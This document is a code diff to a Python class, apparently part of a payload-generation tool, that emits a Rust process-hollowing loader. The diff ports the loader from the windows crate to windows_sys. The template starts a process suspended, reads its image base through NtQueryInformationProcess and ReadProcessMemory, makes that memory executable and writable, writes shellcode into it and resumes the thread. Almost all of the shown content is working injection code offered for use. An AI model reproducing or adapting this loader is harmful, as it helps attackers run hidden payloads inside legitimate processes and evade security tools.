@@ -1,27 +1,27 @@
 class processhollow:
 
     def imports(self):
-        return ['extern crate windows;', 
-                'use windows::Win32::System::Memory::VirtualProtectEx;'
-                'use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;'
-                'use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;'
-                'use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;'
-                'use windows::Win32::System::Threading::CreateProcessA;'
-                'use windows::Win32::System::Threading::ResumeThread;'
-                'use windows::Win32::System::Threading::STARTUPINFOA;'
-                'use windows::Win32::System::Threading::PROCESS_INFORMATION;'
-                'use windows::Wdk::System::Threading::PROCESSINFOCLASS;'
-                'use windows::Win32::System::Threading::PROCESS_BASIC_INFORMATION;'
-                'use windows::Wdk::System::Threading::NtQueryInformationProcess;'
-                'use windows::Win32::System::Threading::CREATE_SUSPENDED;'
-                'use windows::core::PSTR;',
+        return ['extern crate windows_sys;', 
+                'use windows_sys::Win32::System::Memory::VirtualProtectEx;'
+                'use windows_sys::Win32::System::Memory::PAGE_PROTECTION_FLAGS;'
+                'use windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory;'
+                'use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;'
+                'use windows_sys::Win32::System::Threading::CreateProcessA;'
+                'use windows_sys::Win32::System::Threading::ResumeThread;'
+                'use windows_sys::Win32::System::Threading::STARTUPINFOA;'
+                'use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;'
+                'use windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION;'
+                'use windows_sys::Wdk::System::Threading::NtQueryInformationProcess;'
+                'use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;'
+                'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;'
                 'use std::ffi::CString;'
                 'use core::ffi::c_void;'
                 'use std::mem::size_of;'
+                'use std::ptr;'
                 ]
 
     def compilerOptions(self):
-        return ['windows = { version = "0.58", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Kernel", "Wdk_System", "Wdk_System_Threading"] }',
+        return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Kernel", "Wdk_System", "Wdk_System_Threading"] }',
                 ]
 
     def template(self):
@@ -49,14 +49,14 @@ fn main() {{
 
 
         let _ = CreateProcessA(
-            None,
-            PSTR(name.as_ptr() as *mut u8), 
-            None, 
-            None, 
-            false, 
+            ptr::null_mut(),
+            name.as_ptr() as *mut u8, 
+            ptr::null_mut(), 
+            ptr::null_mut(), 
+            0, 
             CREATE_SUSPENDED, 
-            None, 
-            None, 
+            ptr::null_mut(), 
+            ptr::null_mut(), 
             &lpstartupinfo as *const STARTUPINFOA, 
             &mut lpprocessinformation as *mut PROCESS_INFORMATION,
             );
@@ -67,7 +67,7 @@ fn main() {{
 
         let _err = NtQueryInformationProcess(
             (lpprocessinformation).hProcess, 
-            PROCESSINFOCLASS(0), 
+            0, 
             processinformation, 
             size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
             &mut return_length);
@@ -85,7 +85,7 @@ fn main() {{
             lpbaseaddress, 
             lpbuffer, 
             buffer.len(), 
-            None);
+            ptr::null_mut());
         
         let svchost:*mut i64 =  std::mem::transmute(lpbuffer);   
         let svchost_base: *mut i64 = (*svchost) as *mut i64;
@@ -99,7 +99,7 @@ fn main() {{
             lpbaseaddress, 
             lpbuffer, 
             buffer.len(), 
-            None);
+            ptr::null_mut());
 
         let svchost_base_address:*mut i64 =  std::mem::transmute(lpbuffer);  
         let e_lfanew_offset = *((svchost_base_address as i64 + 0x3C) as *mut i32);
@@ -111,14 +111,11 @@ fn main() {{
         let lpbuffer: *mut c_void = std::mem::transmute(shellcode.as_ptr());
         let lpfloldprotect: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());
 
-        let mut flnewprotect = PAGE_PROTECTION_FLAGS::default();
-        flnewprotect.0 = 0x40;
-
         let _ = VirtualProtectEx(
             (lpprocessinformation).hProcess, 
             lpbaseaddress, 
             shellcode.len() as usize, 
-            flnewprotect, 
+            PAGE_EXECUTE_READWRITE, 
             lpfloldprotect);
 
         let _ = WriteProcessMemory(
@@ -126,7 +123,7 @@ fn main() {{
             lpbaseaddress, 
             lpbuffer, 
             shellcode.len() as usize, 
-            None);
+            ptr::null_mut());
 
         
         let tmp: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());
